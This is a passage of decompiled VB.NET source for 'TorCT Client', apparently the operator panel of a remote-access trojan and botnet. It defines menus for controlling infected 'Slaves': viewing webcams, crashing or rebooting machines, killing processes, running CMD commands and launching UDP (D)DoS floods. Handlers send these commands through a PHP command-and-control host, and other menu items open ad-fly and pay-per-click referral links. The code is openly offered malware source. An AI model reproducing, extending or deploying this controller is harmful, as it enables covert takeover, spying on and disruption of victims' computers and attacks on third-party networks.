            Me.SleepToolStripMenuItem.Size = size
            Me.SleepToolStripMenuItem.Text = "Sleep"
            Me.SleepToolStripMenuItem.Visible = False
            Me.WakeToolStripMenuItem.Image = DirectCast(manager.GetObject("WakeToolStripMenuItem.Image"), Image)
            Me.WakeToolStripMenuItem.Name = "WakeToolStripMenuItem"
            size = New Size(&HB9, &H16)
            Me.WakeToolStripMenuItem.Size = size
            Me.WakeToolStripMenuItem.Text = "Wake"
            Me.WakeToolStripMenuItem.Visible = False
            Me.GetProceToolStripMenuItem.Image = DirectCast(manager.GetObject("GetProceToolStripMenuItem.Image"), Image)
            Me.GetProceToolStripMenuItem.Name = "GetProceToolStripMenuItem"
            size = New Size(&HB9, &H16)
            Me.GetProceToolStripMenuItem.Size = size
            Me.GetProceToolStripMenuItem.Text = "Get Process List"
            Me.GetProceToolStripMenuItem.Visible = False
            Me.KillProcessToolStripMenuItem.Image = DirectCast(manager.GetObject("KillProcessToolStripMenuItem.Image"), Image)
            Me.KillProcessToolStripMenuItem.Name = "KillProcessToolStripMenuItem"
            size = New Size(&HB9, &H16)
            Me.KillProcessToolStripMenuItem.Size = size
            Me.KillProcessToolStripMenuItem.Text = "Kill Process"
            Me.KillProcessToolStripMenuItem.Visible = False
            Me.FunThingsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.CrashComputerToolStripMenuItem, Me.TalkComputerToolStripMenuItem, Me.MsgboxToolStripMenuItem, Me.OpenChatToolStripMenuItem, Me.ShowImageToolStripMenuItem })
            Me.FunThingsToolStripMenuItem.Image = DirectCast(manager.GetObject("FunThingsToolStripMenuItem.Image"), Image)
            Me.FunThingsToolStripMenuItem.Name = "FunThingsToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.FunThingsToolStripMenuItem.Size = size
            Me.FunThingsToolStripMenuItem.Text = "Fun Things"
            Me.CrashComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("CrashComputerToolStripMenuItem.Image"), Image)
            Me.CrashComputerToolStripMenuItem.Name = "CrashComputerToolStripMenuItem"
            size = New Size(&HA1, &H16)
            Me.CrashComputerToolStripMenuItem.Size = size
            Me.CrashComputerToolStripMenuItem.Text = "Crash Computer"
            Me.TalkComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("TalkComputerToolStripMenuItem.Image"), Image)
            Me.TalkComputerToolStripMenuItem.Name = "TalkComputerToolStripMenuItem"
            size = New Size(&HA1, &H16)
            Me.TalkComputerToolStripMenuItem.Size = size
            Me.TalkComputerToolStripMenuItem.Text = "Talk Computer"
            Me.MsgboxToolStripMenuItem.Image = DirectCast(manager.GetObject("MsgboxToolStripMenuItem.Image"), Image)
            Me.MsgboxToolStripMenuItem.Name = "MsgboxToolStripMenuItem"
            size = New Size(&HA1, &H16)
            Me.MsgboxToolStripMenuItem.Size = size
            Me.MsgboxToolStripMenuItem.Text = "Msgbox"
            Me.OpenChatToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenChatToolStripMenuItem.Image"), Image)
            Me.OpenChatToolStripMenuItem.Name = "OpenChatToolStripMenuItem"
            size = New Size(&HA1, &H16)
            Me.OpenChatToolStripMenuItem.Size = size
            Me.OpenChatToolStripMenuItem.Text = "Open Chat"
            Me.ShowImageToolStripMenuItem.Image = DirectCast(manager.GetObject("ShowImageToolStripMenuItem.Image"), Image)
            Me.ShowImageToolStripMenuItem.Name = "ShowImageToolStripMenuItem"
            size = New Size(&HA1, &H16)
            Me.ShowImageToolStripMenuItem.Size = size
            Me.ShowImageToolStripMenuItem.Text = "Show Image"
            Me.DdoSToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.UDPToolStripMenuItem })
            Me.DdoSToolStripMenuItem.Image = DirectCast(manager.GetObject("DdoSToolStripMenuItem.Image"), Image)
            Me.DdoSToolStripMenuItem.Name = "DdoSToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.DdoSToolStripMenuItem.Size = size
            Me.DdoSToolStripMenuItem.Text = "(D)DoS"
            Me.UDPToolStripMenuItem.Image = DirectCast(manager.GetObject("UDPToolStripMenuItem.Image"), Image)
            Me.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem"
            size = New Size(&H61, &H16)
            Me.UDPToolStripMenuItem.Size = size
            Me.UDPToolStripMenuItem.Text = "UDP"
            Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
            size = New Size(&HB3, 6)
            Me.ToolStripSeparator3.Size = size
            Me.DeliteSlaveToolStripMenuItem.Image = DirectCast(manager.GetObject("DeliteSlaveToolStripMenuItem.Image"), Image)
            Me.DeliteSlaveToolStripMenuItem.Name = "DeliteSlaveToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.DeliteSlaveToolStripMenuItem.Size = size
            Me.DeliteSlaveToolStripMenuItem.Text = "Delete Slave"
            Me.VieuwWebcamToolStripMenuItem.Image = DirectCast(manager.GetObject("VieuwWebcamToolStripMenuItem.Image"), Image)
            Me.VieuwWebcamToolStripMenuItem.Name = "VieuwWebcamToolStripMenuItem"
            size = New Size(&HB6, &H1A)
            Me.VieuwWebcamToolStripMenuItem.Size = size
            Me.VieuwWebcamToolStripMenuItem.Text = "View Webcam"
            Me.Panel1.Controls.Add(Me.Panel2)
            Me.Panel1.Controls.Add(Me.Panel3)
            Me.Panel1.Controls.Add(Me.Panel4)
            Me.Panel1.Dock = DockStyle.Bottom
            point = New Point(0, &H111)
            Me.Panel1.Location = point
            Me.Panel1.Name = "Panel1"
            size = New Size(&H35A, &H60)
            Me.Panel1.Size = size
            Me.Panel1.TabIndex = &H1B
            Me.Panel2.BorderStyle = BorderStyle.FixedSingle
            Me.Panel2.Controls.Add(Me.phpv)
            Me.Panel2.Controls.Add(Me.Label3)
            Me.Panel2.Controls.Add(Me.SelectedV)
            Me.Panel2.Controls.Add(Me.HostText)
            Me.Panel2.Controls.Add(Me.Label2)
            Me.Panel2.Dock = DockStyle.Fill
            point = New Point(0, &H26)
            Me.Panel2.Location = point
            Me.Panel2.Name = "Panel2"
            size = New Size(&H35A, &H3A)
            Me.Panel2.Size = size
            Me.Panel2.TabIndex = &H1D
            Me.phpv.AutoSize = True
            point = New Point(3, &H2B)
            Me.phpv.Location = point
            Me.phpv.Name = "phpv"
            size = New Size(&H49, 13)
            Me.phpv.Size = size
            Me.phpv.TabIndex = &H20
            Me.phpv.Text = "Version PHP :"
            Me.Label3.AutoSize = True
            point = New Point(3, &H1C)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H2B, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = &H1F
            Me.Label3.Text = "News : "
            Me.SelectedV.AutoSize = True
            point = New Point(&H287, &H6A)
            Me.SelectedV.Location = point
            Me.SelectedV.Name = "SelectedV"
            size = New Size(&H35, 13)
            Me.SelectedV.Size = size
            Me.SelectedV.TabIndex = &H16
            Me.SelectedV.Text = "All Slaves"
            Me.HostText.AutoSize = True
            point = New Point(3, 15)
            Me.HostText.Location = point
            Me.HostText.Name = "HostText"
            size = New Size(&H26, 13)
            Me.HostText.Size = size
            Me.HostText.TabIndex = 30
            Me.HostText.Text = "Host : " & ChrW(13) & ChrW(10)
            Me.Label2.AutoSize = True
            point = New Point(3, 2)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&HA1, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = &H1D
            Me.Label2.Text = "Version : 6.21.0.4 CLOSED-Beta" & ChrW(13) & ChrW(10)
            Me.Panel3.Controls.Add(Me.SOnline)
            Me.Panel3.Controls.Add(Me.Panel5)
            Me.Panel3.Controls.Add(Me.Label1)
            Me.Panel3.Controls.Add(Me.Conected)
            Me.Panel3.Dock = DockStyle.Top
            point = New Point(0, &H13)
            Me.Panel3.Location = point
            Me.Panel3.Name = "Panel3"
            size = New Size(&H35A, &H13)
            Me.Panel3.Size = size
            Me.Panel3.TabIndex = 30
            Me.SOnline.AutoSize = True
            Me.SOnline.Dock = DockStyle.Right
            point = New Point(&H2F3, 3)
            Me.SOnline.Location = point
            Me.SOnline.Name = "SOnline"
            size = New Size(&H57, 13)
            Me.SOnline.Size = size
            Me.SOnline.TabIndex = &H15
            Me.SOnline.Text = "Slaves Online : 0"
            Me.Panel5.Dock = DockStyle.Top
            point = New Point(0, 0)
            Me.Panel5.Location = point
            Me.Panel5.Name = "Panel5"
            size = New Size(&H34A, 3)
            Me.Panel5.Size = size
            Me.Panel5.TabIndex = 30
            Me.Label1.AutoSize = True
            Me.Label1.Cursor = Cursors.Hand
            Me.Label1.Dock = DockStyle.Right
            Me.Label1.Font = New Font("Microsoft Sans Serif", 12!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(&H34A, 0)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H10, 20)
            Me.Label1.Size = size
            Me.Label1.TabIndex = &H1D
            Me.Label1.Text = "↑"
            Me.Conected.AutoSize = True
            point = New Point(5, 3)
            Me.Conected.Location = point
            Me.Conected.Name = "Conected"
            size = New Size(&H56, 13)
            Me.Conected.Size = size
            Me.Conected.TabIndex = &H13
            Me.Conected.Text = "Connected : ???"
            Me.Panel4.BackColor = Color.White
            Me.Panel4.BorderStyle = BorderStyle.FixedSingle
            Me.Panel4.Controls.Add(Me.PictureBox1)
            Me.Panel4.Controls.Add(Me.ExtrainfoLabel)
            Me.Panel4.Dock = DockStyle.Top
            point = New Point(0, 0)
            Me.Panel4.Location = point
            Me.Panel4.Name = "Panel4"
            size = New Size(&H35A, &H13)
            Me.Panel4.Size = size
            Me.Panel4.TabIndex = &H1F
            Me.PictureBox1.BackgroundImage = Resources.Unknown
            point = New Point(6, 1)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H10, &H10)
            Me.PictureBox1.Size = size
            Me.PictureBox1.TabIndex = &H1D
            Me.PictureBox1.TabStop = False
            Me.ExtrainfoLabel.AutoSize = True
            point = New Point(&H1C, 2)
            Me.ExtrainfoLabel.Location = point
            Me.ExtrainfoLabel.Name = "ExtrainfoLabel"
            size = New Size(490, 13)
            Me.ExtrainfoLabel.Size = size
            Me.ExtrainfoLabel.TabIndex = &H1D
            Me.ExtrainfoLabel.Text = "[XX] - ALL Selected    Computer Name : ALL Selected    AntiVirus : ALL Selected     OS : ALL Selected"
            size = New Size(20, 20)
            Me.MenuStrip1.ImageScalingSize = size
            Me.MenuStrip1.Items.AddRange(New ToolStripItem() { Me.ClientSettingsToolStripMenuItem, Me.ServerSettingsToolStripMenuItem, Me.SlavesToolStripMenuItem, Me.HelpTorCTToolStripMenuItem, Me.OtherToolStripMenuItem })
            point = New Point(0, 0)
            Me.MenuStrip1.Location = point
            Me.MenuStrip1.Name = "MenuStrip1"
            size = New Size(&H35A, &H1C)
            Me.MenuStrip1.Size = size
            Me.MenuStrip1.TabIndex = &H1C
            Me.MenuStrip1.Text = "MenuStrip1"
            Me.ClientSettingsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ClientSettingsToolStripMenuItem1, Me.RestartClientToolStripMenuItem, Me.ClientPasswordhostToolStripMenuItem, Me.ShowClientLogsToolStripMenuItem })
            Me.ClientSettingsToolStripMenuItem.Image = DirectCast(manager.GetObject("ClientSettingsToolStripMenuItem.Image"), Image)
            Me.ClientSettingsToolStripMenuItem.Name = "ClientSettingsToolStripMenuItem"
            size = New Size(&H73, &H18)
            Me.ClientSettingsToolStripMenuItem.Size = size
            Me.ClientSettingsToolStripMenuItem.Text = "Client Settings"
            Me.ClientSettingsToolStripMenuItem1.Image = DirectCast(manager.GetObject("ClientSettingsToolStripMenuItem1.Image"), Image)
            Me.ClientSettingsToolStripMenuItem1.Name = "ClientSettingsToolStripMenuItem1"
            size = New Size(&HC0, &H16)
            Me.ClientSettingsToolStripMenuItem1.Size = size
            Me.ClientSettingsToolStripMenuItem1.Text = "Client host"
            Me.RestartClientToolStripMenuItem.Image = DirectCast(manager.GetObject("RestartClientToolStripMenuItem.Image"), Image)
            Me.RestartClientToolStripMenuItem.Name = "RestartClientToolStripMenuItem"
            size = New Size(&HC0, &H16)
            Me.RestartClientToolStripMenuItem.Size = size
            Me.RestartClientToolStripMenuItem.Text = "Restart Client"
            Me.ClientPasswordhostToolStripMenuItem.Image = DirectCast(manager.GetObject("ClientPasswordhostToolStripMenuItem.Image"), Image)
            Me.ClientPasswordhostToolStripMenuItem.Name = "ClientPasswordhostToolStripMenuItem"
            size = New Size(&HC0, &H16)
            Me.ClientPasswordhostToolStripMenuItem.Size = size
            Me.ClientPasswordhostToolStripMenuItem.Text = "Client Password (host)"
            Me.ShowClientLogsToolStripMenuItem.Image = DirectCast(manager.GetObject("ShowClientLogsToolStripMenuItem.Image"), Image)
            Me.ShowClientLogsToolStripMenuItem.Name = "ShowClientLogsToolStripMenuItem"
            size = New Size(&HC0, &H16)
            Me.ShowClientLogsToolStripMenuItem.Size = size
            Me.ShowClientLogsToolStripMenuItem.Text = "Show Client Logs"
            Me.ServerSettingsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.UpdToolStripMenuItem })
            Me.ServerSettingsToolStripMenuItem.Image = DirectCast(manager.GetObject("ServerSettingsToolStripMenuItem.Image"), Image)
            Me.ServerSettingsToolStripMenuItem.Name = "ServerSettingsToolStripMenuItem"
            size = New Size(&H74, &H18)
            Me.ServerSettingsToolStripMenuItem.Size = size
            Me.ServerSettingsToolStripMenuItem.Text = "Server Settings"
            Me.UpdToolStripMenuItem.Image = DirectCast(manager.GetObject("UpdToolStripMenuItem.Image"), Image)
            Me.UpdToolStripMenuItem.Name = "UpdToolStripMenuItem"
            size = New Size(170, &H16)
            Me.UpdToolStripMenuItem.Size = size
            Me.UpdToolStripMenuItem.Text = "Create New Server"
            Me.SlavesToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RefreshSlavesToolStripMenuItem1, Me.DeliteAllToolStripMenuItem, Me.SelectAllSlavesToolStripMenuItem })
            Me.SlavesToolStripMenuItem.Image = DirectCast(manager.GetObject("SlavesToolStripMenuItem.Image"), Image)
            Me.SlavesToolStripMenuItem.Name = "SlavesToolStripMenuItem"
            size = New Size(&H47, &H18)
            Me.SlavesToolStripMenuItem.Size = size
            Me.SlavesToolStripMenuItem.Text = "Slaves"
            Me.RefreshSlavesToolStripMenuItem1.Image = DirectCast(manager.GetObject("RefreshSlavesToolStripMenuItem1.Image"), Image)
            Me.RefreshSlavesToolStripMenuItem1.Name = "RefreshSlavesToolStripMenuItem1"
            size = New Size(&H9D, &H16)
            Me.RefreshSlavesToolStripMenuItem1.Size = size
            Me.RefreshSlavesToolStripMenuItem1.Text = "Refresh Slaves"
            Me.DeliteAllToolStripMenuItem.Image = DirectCast(manager.GetObject("DeliteAllToolStripMenuItem.Image"), Image)
            Me.DeliteAllToolStripMenuItem.Name = "DeliteAllToolStripMenuItem"
            size = New Size(&H9D, &H16)
            Me.DeliteAllToolStripMenuItem.Size = size
            Me.DeliteAllToolStripMenuItem.Text = "Update Server"
            Me.SelectAllSlavesToolStripMenuItem.Image = DirectCast(manager.GetObject("SelectAllSlavesToolStripMenuItem.Image"), Image)
            Me.SelectAllSlavesToolStripMenuItem.Name = "SelectAllSlavesToolStripMenuItem"
            size = New Size(&H9D, &H16)
            Me.SelectAllSlavesToolStripMenuItem.Size = size
            Me.SelectAllSlavesToolStripMenuItem.Text = "Select All Slaves"
            Me.HelpTorCTToolStripMenuItem.Alignment = ToolStripItemAlignment.Right
            Me.HelpTorCTToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.DonatePaypallToolStripMenuItem, Me.OpenAdflyLinksGoogleToolStripMenuItem, Me.OpenOtherPPCToolStripMenuItem, Me.OpenAdflyToolStripMenuItem })
            Me.HelpTorCTToolStripMenuItem.Image = DirectCast(manager.GetObject("HelpTorCTToolStripMenuItem.Image"), Image)
            Me.HelpTorCTToolStripMenuItem.Name = "HelpTorCTToolStripMenuItem"
            size = New Size(100, &H18)
            Me.HelpTorCTToolStripMenuItem.Size = size
            Me.HelpTorCTToolStripMenuItem.Text = "Help TorCT"
            Me.DonatePaypallToolStripMenuItem.Image = DirectCast(manager.GetObject("DonatePaypallToolStripMenuItem.Image"), Image)
            Me.DonatePaypallToolStripMenuItem.Name = "DonatePaypallToolStripMenuItem"
            size = New Size(&HD5, &H16)
            Me.DonatePaypallToolStripMenuItem.Size = size
            Me.DonatePaypallToolStripMenuItem.Text = "Donate Paypall"
            Me.OpenAdflyLinksGoogleToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenAdflyLinksGoogleToolStripMenuItem.Image"), Image)
            Me.OpenAdflyLinksGoogleToolStripMenuItem.Name = "OpenAdflyLinksGoogleToolStripMenuItem"
            size = New Size(&HD5, &H16)
            Me.OpenAdflyLinksGoogleToolStripMenuItem.Size = size
            Me.OpenAdflyLinksGoogleToolStripMenuItem.Text = "Open Adfly Links (Google)"
            Me.OpenOtherPPCToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenOtherPPCToolStripMenuItem.Image"), Image)
            Me.OpenOtherPPCToolStripMenuItem.Name = "OpenOtherPPCToolStripMenuItem"
            size = New Size(&HD5, &H16)
            Me.OpenOtherPPCToolStripMenuItem.Size = size
            Me.OpenOtherPPCToolStripMenuItem.Text = "Open GHED PPC"
            Me.OpenAdflyToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenAdflyToolStripMenuItem.Image"), Image)
            Me.OpenAdflyToolStripMenuItem.Name = "OpenAdflyToolStripMenuItem"
            size = New Size(&HD5, &H16)
            Me.OpenAdflyToolStripMenuItem.Size = size
            Me.OpenAdflyToolStripMenuItem.Text = "My Adfly referal"
            Me.OtherToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.TutorialsToolStripMenuItem, Me.CreditsToolStripMenuItem })
            Me.OtherToolStripMenuItem.Image = DirectCast(manager.GetObject("OtherToolStripMenuItem.Image"), Image)
            Me.OtherToolStripMenuItem.Name = "OtherToolStripMenuItem"
            size = New Size(&H45, &H18)
            Me.OtherToolStripMenuItem.Size = size
            Me.OtherToolStripMenuItem.Text = "Other"
            Me.TutorialsToolStripMenuItem.Image = DirectCast(manager.GetObject("TutorialsToolStripMenuItem.Image"), Image)
            Me.TutorialsToolStripMenuItem.Name = "TutorialsToolStripMenuItem"
            size = New Size(120, &H16)
            Me.TutorialsToolStripMenuItem.Size = size
            Me.TutorialsToolStripMenuItem.Text = "Tutorials"
            Me.CreditsToolStripMenuItem.Image = DirectCast(manager.GetObject("CreditsToolStripMenuItem.Image"), Image)
            Me.CreditsToolStripMenuItem.Name = "CreditsToolStripMenuItem"
            size = New Size(120, &H16)
            Me.CreditsToolStripMenuItem.Size = size
            Me.CreditsToolStripMenuItem.Text = "Credits"
            Me.Timer2.Interval = &H578
            Me.Timer1.Enabled = True
            Me.Timer1.Interval = &HEA60
            Me.ImageList1.ImageStream = DirectCast(manager.GetObject("ImageList1.ImageStream"), ImageListStreamer)
            Me.ImageList1.TransparentColor = Color.Transparent
            Me.ImageList1.Images.SetKeyName(0, "Netherlands.png")
            Me.Panel6.Controls.Add(Me.RichTextBox1)
            Me.Panel6.Dock = DockStyle.Right
            point = New Point(&H350, &H1C)
            Me.Panel6.Location = point
            Me.Panel6.Name = "Panel6"
            size = New Size(10, &HF5)
            Me.Panel6.Size = size
            Me.Panel6.TabIndex = &H1D
            Me.RichTextBox1.Dock = DockStyle.Fill
            point = New Point(0, 0)
            Me.RichTextBox1.Location = point
            Me.RichTextBox1.Name = "RichTextBox1"
            size = New Size(10, &HF5)
            Me.RichTextBox1.Size = size
            Me.RichTextBox1.TabIndex = 0
            Me.RichTextBox1.Text = ""
            Me.Timer3.Interval = &H2710
            Me.ToolStripSeparator4.Name = "ToolStripSeparator4"
            size = New Size(&HCA, 6)
            Me.ToolStripSeparator4.Size = size
            Me.GetActiveWindowToolStripMenuItem.Image = DirectCast(manager.GetObject("GetActiveWindowToolStripMenuItem.Image"), Image)
            Me.GetActiveWindowToolStripMenuItem.Name = "GetActiveWindowToolStripMenuItem"
            size = New Size(&HCD, &H1A)
            Me.GetActiveWindowToolStripMenuItem.Size = size
            Me.GetActiveWindowToolStripMenuItem.Text = "Get Active Window"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H35A, &H171)
            Me.ClientSize = size
            Me.Controls.Add(Me.ListView1)
            Me.Controls.Add(Me.Panel6)
            Me.Controls.Add(Me.Panel1)
            Me.Controls.Add(Me.MenuStrip1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Client"
            Me.Text = " TorCT Client"
            Me.ContextMenuStrip1.ResumeLayout(False)
            Me.Panel1.ResumeLayout(False)
            Me.Panel2.ResumeLayout(False)
            Me.Panel2.PerformLayout
            Me.Panel3.ResumeLayout(False)
            Me.Panel3.PerformLayout
            Me.Panel4.ResumeLayout(False)
            Me.Panel4.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.MenuStrip1.ResumeLayout(False)
            Me.MenuStrip1.PerformLayout
            Me.Panel6.ResumeLayout(False)
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub KillProcessToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.InputVlaue = Interaction.InputBox("Please Fill the process name", "Process killer", "", -1, -1)
            If (Me.InputVlaue = "") Then
                Interaction.MsgBox("Please Fill somthing in!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=KillProcess747:" & Me.InputVlaue.ToString & Me.Strvictem.ToString))
                Interaction.MsgBox(Me.InputVlaue, MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub Label1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim size As Size
            If (Me.Label1.Text = "↓") Then
                size = New Size(0, &H24)
                Me.Panel1.Size = size
                Me.Label1.Text = "↑"
            Else
                size = New Size(0, &H68)
                Me.Panel1.Size = size
                Me.Label1.Text = "↓"
            End If
        End Sub

        Private Sub ListView1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
            Dim count As Integer = 0
            count = Me.ListView1.Items.Count
            If (Me.ListView1.FocusedItem.Index <> count) Then
                Dim text As String = Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(4).Text
                Me.SelectedV.Text = [text]
                If (Me.CS <> "") Then
                    Me.Strvictem = ("&SpecialUser=" & Me.SelectedV.Text & "&Pass=" & Me.CS.ToString)
                Else
                    Me.Strvictem = ("&SpecialUser=" & Me.SelectedV.Text)
                End If
                Me.L = Strings.Split(Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(1).Text, "]", 2, CompareMethod.Binary)
                Dim expression As String = Strings.Replace(Me.L(1).ToString, " - ", "", 1, -1, CompareMethod.Binary).ToString
                If (expression = "") Then
                    expression = "Unknown"
                End If
                expression = Strings.Replace(expression, " ", "_", 1, -1, CompareMethod.Binary).ToString
                Try 
                    Me.PictureBox1.BackgroundImage = DirectCast(Resources.ResourceManager.GetObject(expression), Image)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Me.PictureBox1.BackgroundImage = Resources.Unknown
                    ProjectData.ClearProjectError
                End Try
                Me.ExtrainfoLabel.Text = String.Concat(New String() { Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(1).Text, "     ComputerName : ", Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(4).Text, "     Antivirus : ", Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(7).Text, "     OS : ", Me.ListView1.Items.Item(Me.ListView1.FocusedItem.Index).SubItems.Item(3).Text })
            End If
        End Sub

        Private Sub MenuStrip1_ItemClicked(ByVal sender As Object, ByVal e As ToolStripItemClickedEventArgs)
        End Sub

        Private Sub MsgboxToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.InputVlaue = Interaction.InputBox("Please Fill In The Text to Popup!", "Popup", "", -1, -1)
            If (Me.InputVlaue = "") Then
                Interaction.MsgBox("Please Fill somthing in!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=MSGBOX747:" & Me.InputVlaue.ToString & Me.Strvictem.ToString))
                Interaction.MsgBox("Sended to Server", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub OpenAdflyLinksGoogleToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start("http://adf.ly/jEGob")
            Process.Start("http://adf.ly/jEHKh")
            Process.Start("http://adf.ly/jEHQK")
        End Sub

        Private Sub OpenAdflyToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start("http://adf.ly/?id=1602440")
        End Sub

        Private Sub OpenCDDToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=CDOPEN747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub OpenChatToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Try 
                    Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=CHAT747" & Me.Strvictem.ToString))
                    MyProject.Forms.Chat.Show
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError
                End Try
            End If
        End Sub

        Private Sub OpenNotepadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Try 
                    Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=Notepad747" & Me.Strvictem.ToString))
                    Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("Somthing is wrong", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub OpenOtherPPCToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start("http://www.gratisinschrijving.nl/klikker.php?iduser=100048793&idurl=58")
            Process.Start("http://www.gratisinschrijving.nl/klikker.php?iduser=100048793&idurl=58")
            Process.Start("http://www.gratisinschrijving.nl/klikker.php?iduser=100048793&idurl=71")
        End Sub

        Private Sub ProcessViewerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.SelectedV.Text.Contains("All Slaves") Then
                Interaction.MsgBox("Please Select only 1 victem!", MsgBoxStyle.ApplicationModal, Nothing)
            Else
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ProcessViewer747" & Me.Strvictem.ToString))
                MyProject.Forms.processviewer.Show
            End If
        End Sub

        Private Sub RefreshSlavesToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub RefreshSlavesToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/SlaveOnline.php?online=Refreshslaves747"))
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=Refreshslaves747&SpecialUser=False"))
                Me.Timer2.Start
                Me.SOnline.Text = "Slaves Online : WAITING FOR REFRESH : Online Slaves"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't Send Action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RestartClientToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Application.Restart
        End Sub

        Private Sub RestartComputerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=ReBootPC747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RunBatchScriptCMDToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MyProject.Forms.CMDScript.Show
        End Sub

        Private Sub RunCmdToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((Me.HostName.ToString & "/AddFN.php?Function=CMD747" & Me.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
